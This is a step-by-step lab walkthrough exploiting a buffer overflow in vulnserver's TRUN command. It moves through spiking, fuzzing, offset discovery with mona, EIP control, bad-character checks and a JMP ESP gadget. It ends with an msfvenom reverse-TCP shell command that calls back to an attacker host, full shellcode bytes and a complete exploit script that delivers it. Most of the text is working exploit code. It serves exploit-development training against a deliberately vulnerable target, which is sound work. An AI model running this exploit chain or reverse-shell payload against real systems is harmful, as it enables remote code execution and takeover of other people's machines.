# TRUN

## Spiking

Note that vulnserver has many commands available:

![Commands](https://i.imgur.com/IDF5qqs.png)

In order to figure out which commands are vulnerable, we use `generic_send_tcp` to "spike" the executable and look for crashes:

```bash
generic_send_tcp <ip> <port> <spike_script> <SKIPVAR=0> <SKIPSTR=0>
```

Suppose we want to spike the TRUN command, then the spike script is:

```bash
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

Run vulnserver by pressing F9 in Immunity Debugger. From our Linux attack machine, spike it:

```bash
generic_send_tcp 192.168.1.2 9999 trun.spk 0 0
```

Immidiately, the executable crashed. We can confirm that the `TRUN` command has BoF vulnerability:

![Crash](https://i.imgur.com/YR24rqI.png)

## Fuzzing

Restart vulnserver by pressing Ctrl+F2 in Immunity Debugger and then run it by pressing F9. Run the fuzzer to crash the executable's `TRUN` command:

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

buffer = b"A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        payload = b"TRUN /.:/" + buffer

        print(f"[+] Sending the payload of length {len(buffer)}...")
        s.send(payload)
        s.close()

        sleep(1)
        buffer += b"A" * 100

    except:
        print(f"Fuzzer crashed at {len(buffer)} bytes")
        sys.exit()
```

Here we should manually encode everything with `b""` instead of using `.encode()` since `.encode()` turns a byte into its Unicode representation:

![Unicode](https://i.imgur.com/Fzoq4Vh.png)

After a while, vulnserver crashes:

![Crash](https://i.imgur.com/RN8HfHs.png)

Here we learn that the offset is less than 3000 bytes. We only want to know an approximate value in this step, and we will figure out the exact offset in the next step.

## Finding the Offset

Download `mona.py` to local machine:

https://raw.githubusercontent.com/corelan/mona/master/mona.py

Put `mona.py` in "C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands". Set "C:\mona" as the workingfolder:

```
!mona config -set workingfolder c:\mona
```

Generate a pattern:

```
!mona pc 3000
```

The output will be saved as "pattern.txt" in your working folder.

Write a script to feed this pattern to vulnserver through the `TRUN` command:

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

# !mona pc 3000
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	payload = b"TRUN /.:/" + pattern

	s.send(payload)
	s.close()

except:
	print("Error connecting to server")
	sys.exit()
```

As expected, vulnserver crashes. Note that EIP value is overwritten by the pattern:

![EIP](https://i.imgur.com/U9686rM.png)

Grab the EIP content and find the offset:

```
!mona po <eip_value>
```

The offset is 2003:

![Offset](https://i.imgur.com/CdlTKhW.png)

## Overwriting the EIP

Once we learn the offset, we need to verify if we are able to control EIP. Write a script:

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

offset = 2003

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	payload = b""
	payload += b"TRUN /.:/"
	payload += b"A" * offset # Padding
	payload += b"B" * 4 # EIP

	s.send(payload)
	s.close()

except:
	print("Error connecting to server")
	sys.exit()
```

As expected, EIP becomes 0x42424242:

![EIP overwrite](https://i.imgur.com/OBJde4U.png)

## Find Bad Characters

Some programs terminate on certain "bad characters" (badchars) and we want to make sure that our shellcode does not contain any badchar.

Generate badchar list using Mona:

```
!mona bytearray -cpb "\x00"
```

The output will be saved as "bytearray.txt" in your working folder. This command also generates a "bytearray.bin" file which we will be using shortly.

Write a script for testing badchars:

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

# !mona bytearray -cpb "\x00"
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

offset = 2003

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	payload = b""
	payload += b"TRUN /.:/"
	payload += b"A" * offset # Padding
	payload += b"B" * 4 # EIP
	payload += badchars

	s.send(payload)
	s.close()

except:
	print("Error connecting to server")
	sys.exit()
```

Run the script and vulnserver crashes. We will use this ESP value to find badchars:

![ESP](https://i.imgur.com/UVaP8X2.png)

Find badchars using Mona:

```
!mona compare -f c:\mona\bytearray.bin -a <esp_value>
```

There is no badchar:

![No badchar](https://i.imgur.com/PnxUgFk.png)

If any badchar is found, delete this badchar from the script and run it again. Repeat this process until all badchars are found.

## Finding the Right Module

Find a JMP ESP gadget using Mona:

```
!mona jmp -r esp -cpb "<badchars>"
```

Go to "Log" by pressing Alt+L. Mona finds 9 gadgets and we can pick any gadget in this case:

![JMP ESP](https://i.imgur.com/mtdPa4O.png)

## Generating Shellcode and Gaining Root

Generate a shellcode using Msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=443 EXITFUNC=thread -f python -a x86 -b "<badchars>"
```

Write the final script:

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=443 EXITFUNC=thread -f python -a x86 -b "\x00"
buf =  b""
buf += b"\xbd\x21\x3e\x1f\xb4\xd9\xc9\xd9\x74\x24\xf4\x5b\x31"
buf += b"\xc9\xb1\x52\x31\x6b\x12\x03\x6b\x12\x83\xca\xc2\xfd"
buf += b"\x41\xf0\xd3\x80\xaa\x08\x24\xe5\x23\xed\x15\x25\x57"
buf += b"\x66\x05\x95\x13\x2a\xaa\x5e\x71\xde\x39\x12\x5e\xd1"
buf += b"\x8a\x99\xb8\xdc\x0b\xb1\xf9\x7f\x88\xc8\x2d\x5f\xb1"
buf += b"\x02\x20\x9e\xf6\x7f\xc9\xf2\xaf\xf4\x7c\xe2\xc4\x41"
buf += b"\xbd\x89\x97\x44\xc5\x6e\x6f\x66\xe4\x21\xfb\x31\x26"
buf += b"\xc0\x28\x4a\x6f\xda\x2d\x77\x39\x51\x85\x03\xb8\xb3"
buf += b"\xd7\xec\x17\xfa\xd7\x1e\x69\x3b\xdf\xc0\x1c\x35\x23"
buf += b"\x7c\x27\x82\x59\x5a\xa2\x10\xf9\x29\x14\xfc\xfb\xfe"
buf += b"\xc3\x77\xf7\x4b\x87\xdf\x14\x4d\x44\x54\x20\xc6\x6b"
buf += b"\xba\xa0\x9c\x4f\x1e\xe8\x47\xf1\x07\x54\x29\x0e\x57"
buf += b"\x37\x96\xaa\x1c\xda\xc3\xc6\x7f\xb3\x20\xeb\x7f\x43"
buf += b"\x2f\x7c\x0c\x71\xf0\xd6\x9a\x39\x79\xf1\x5d\x3d\x50"
buf += b"\x45\xf1\xc0\x5b\xb6\xd8\x06\x0f\xe6\x72\xae\x30\x6d"
buf += b"\x82\x4f\xe5\x22\xd2\xff\x56\x83\x82\xbf\x06\x6b\xc8"
buf += b"\x4f\x78\x8b\xf3\x85\x11\x26\x0e\x4e\xde\x1f\x24\x0e"
buf += b"\xb6\x5d\x44\x0f\xfc\xeb\xa2\x65\x12\xba\x7d\x12\x8b"
buf += b"\xe7\xf5\x83\x54\x32\x70\x83\xdf\xb1\x85\x4a\x28\xbf"
buf += b"\x95\x3b\xd8\x8a\xc7\xea\xe7\x20\x6f\x70\x75\xaf\x6f"
buf += b"\xff\x66\x78\x38\xa8\x59\x71\xac\x44\xc3\x2b\xd2\x94"
buf += b"\x95\x14\x56\x43\x66\x9a\x57\x06\xd2\xb8\x47\xde\xdb"
buf += b"\x84\x33\x8e\x8d\x52\xed\x68\x64\x15\x47\x23\xdb\xff"
buf += b"\x0f\xb2\x17\xc0\x49\xbb\x7d\xb6\xb5\x0a\x28\x8f\xca"
buf += b"\xa3\xbc\x07\xb3\xd9\x5c\xe7\x6e\x5a\x7c\x0a\xba\x97"
buf += b"\x15\x93\x2f\x1a\x78\x24\x9a\x59\x85\xa7\x2e\x22\x72"
buf += b"\xb7\x5b\x27\x3e\x7f\xb0\x55\x2f\xea\xb6\xca\x50\x3f"

offset = 2003

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    payload = b""
    payload += b"TRUN /.:/"
    payload += b"A" * offset # Padding
    payload += b"\xaf\x11\x50\x62" # EIP
    payload += b"\x90" * 100 # NOP sled
    payload += buf # Shellcode

    s.send(payload)
    s.close()

except:
    print("Error connecting to server")
    sys.exit()
```

Start a listener and catch a reverse shell:

![Reverse shell](https://i.imgur.com/qaBWMA1.png)